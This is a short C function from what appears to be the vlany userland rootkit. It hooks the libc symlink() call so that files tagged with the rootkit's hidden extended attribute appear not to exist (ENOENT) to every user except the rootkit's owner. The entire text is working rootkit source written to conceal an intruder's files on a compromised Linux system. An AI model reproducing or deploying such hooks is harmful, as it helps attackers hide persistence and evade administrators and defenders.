int symlink(const char *target, const char *linkpath)
{
    #ifdef DEBUG
        printf("[vlany] symlink() called\n");
    #endif

    HOOK(old_symlink, CSYMLINK);

    if(owned()) return old_symlink(target, linkpath);

    if(hidden_xattr(target) || hidden_xattr(linkpath)) { errno = ENOENT; return -1; }

    return old_symlink(target, linkpath);
}
